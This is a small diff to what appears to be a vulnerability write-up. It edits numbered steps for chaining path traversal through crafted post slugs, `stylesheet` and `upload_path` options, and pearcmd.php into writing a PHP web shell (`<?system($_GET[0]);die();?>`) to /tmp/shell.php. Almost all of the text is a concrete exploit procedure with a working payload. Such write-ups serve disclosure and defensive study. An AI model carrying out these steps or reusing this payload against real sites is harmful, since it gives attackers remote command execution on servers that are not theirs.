@@ -130,7 +130,7 @@ To exploit this, follow these steps:
 
 1. Ensure at least two posts exist.
 2. Change the slug of the first to `%2f%2e%2e%2f%2e%2e%2fusr%2flocal%2flib%2fphp%2fpearcmd` and the second to `%2f%2e%2e%2f%2e%2e%2ftmp%2fshell`, and record their post IDs.
-3. Change `stylesheet` option to `../../../../tmp`.
+3. Change `stylesheet` option to `../../../../../../../../tmp/`.
 4. Change `upload_path` option to `/tmp/single-post-`.
 5. Upload an attachment somewhere to create `/tmp/single-post-` folder.
 6. Access `/?p=[PEARCMD_POST_ID]&+config-create+/<?system($_GET[0]);die();?>+/tmp/shell.php` to write a web shell to `/tmp/shell.php`.
